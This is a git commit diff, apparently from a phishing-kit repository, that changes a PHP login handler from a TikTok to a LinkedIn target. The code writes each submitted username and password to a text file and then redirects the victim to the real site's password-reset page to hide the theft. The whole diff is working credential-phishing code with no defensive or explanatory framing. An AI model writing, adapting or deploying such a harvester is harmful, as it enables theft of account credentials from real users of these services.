be8387d501c0248821b896712b33846395fb63dd
ThugGodTools <83690471+ThugGodTools@users.noreply.github.com>
2021-05-05 19:08:37 +0530

    Add files via upload

--- .github/workflows/login.php
+++ .github/workflows/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Tiktok Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.tiktok.com/login/email/forget-password');
+file_put_contents("usernames.txt", "Linkedin Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://www.linkedin.com/uas/request-password-reset');
 exit();
 ?>
